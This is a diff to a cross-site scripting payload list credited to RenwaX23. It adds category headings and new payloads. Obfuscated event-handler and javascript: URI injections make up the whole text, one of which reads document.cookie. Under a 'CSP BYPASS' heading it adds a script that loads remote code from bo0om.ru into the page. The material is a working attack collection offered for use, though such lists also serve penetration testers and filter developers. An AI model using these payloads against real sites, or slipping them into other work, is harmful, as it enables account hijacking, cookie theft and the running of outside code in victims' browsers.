@@ -3,6 +3,9 @@
 #             https://twitter.com/RenwaX23                  #
 #############################################################
 
+
+HTML INJECTION & JAVASCRIPT PAYLOADS:
+
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--renwax23
 
 <mArquee onStart%3D[~[onmouseleave(([[(alert(1))]]))]] ]
@@ -10,8 +13,6 @@
 <img src="/" =_=" title="onerror='/**/prompt(1)'">
 
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
-
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
 <a/onmousemove=alert(1)//>renwax23
 
@@ -33,9 +34,13 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 <style><img src="</style><img src=x "><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
 <embed src=/x//alert(1)><base href="javascript:\
 
-<SPAN " style="display: block; position: absolute; top: 0; left: 0; width: 9999px; height: 9999px; z-index: 9999" foo="></span>renwax23
+\u003csvg/onload=alert`1`\u003e
+
+\<svg/onload=alert`1`\>
 
 <article xmlns ="urn:img src=x onerror=xss()//" >renwax23
 
@@ -166,6 +171,12 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 <input onfocus=alert(1337) </autofocus>
 
 
+CSP BYPASS:
+
+<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
+
+
+HYPERLINK TAG INJECTION:
 
 javascript:alert(1)
 
@@ -178,6 +189,7 @@ javascripT://https://google.com%0aalert(1);//https://google.com
 /x:1/:///%01javascript:alert(document.cookie)/
 
 
+INLINE HTML INJECTION WITHOUT TAG BREAK:
 
 " onclick=alert(1)//">click
 
@@ -187,6 +199,8 @@ javascripT://https://google.com%0aalert(1);//https://google.com
 
 " onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
 
+
+JAVASCRIPT INJECTION:
 
 '?prompt`1`?'
 
